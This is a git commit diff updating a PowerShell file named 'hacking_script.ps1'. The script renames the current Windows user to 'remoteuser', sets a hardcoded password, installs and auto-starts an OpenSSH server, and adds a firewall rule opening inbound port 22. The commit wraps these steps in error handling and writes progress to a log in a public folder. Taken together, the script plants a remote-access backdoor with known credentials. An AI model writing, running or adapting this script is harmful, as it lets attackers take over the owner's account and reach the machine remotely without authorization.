4a976c27c6d6478c2c834b5f42d60a4ee66747b5
ABX532 <a.bplayzzz532@gmail.com>
2026-07-04 11:51:12 +0100

    Update hacking_script.ps1

--- hacking_script.ps1
+++ hacking_script.ps1
@@ -1,12 +1,28 @@
-# Rename current user and change password
-$currentUser = $env:USERNAME
-Rename-LocalUser -Name $currentUser -NewName "remoteuser"
-net user remoteuser up8sWt2KB
+$log = "C:\Users\Public\log.txt"
 
-# Install OpenSSH Server
-Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
-Start-Service sshd
-Set-Service -Name sshd -StartupType 'Automatic'
+try {
+    $currentUser = $env:USERNAME
+    Rename-LocalUser -Name $currentUser -NewName "remoteuser"
+    Add-Content $log "Renamed $currentUser to remoteuser"
+} catch {
+    Add-Content $log "RENAME FAILED: $_"
+}
 
-# Firewall rule
+try {
+    net user remoteuser up8sWt2KB
+    Add-Content $log "Password changed"
+} catch {
+    Add-Content $log "PASSWORD FAILED: $_"
+}
+
+try {
+    Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
+    Start-Service sshd
+    Set-Service -Name sshd -StartupType 'Automatic'
+    Add-Content $log "SSH installed and running"
+} catch {
+    Add-Content $log "SSH FAILED: $_"
+}
+
 New-NetFirewallRule -Name "OpenSSH" -DisplayName "OpenSSH SSH Server" -Direction Inbound -Protocol TCP -LocalPort 22 -Action Allow -ErrorAction SilentlyContinue
+Add-Content $log "Done"
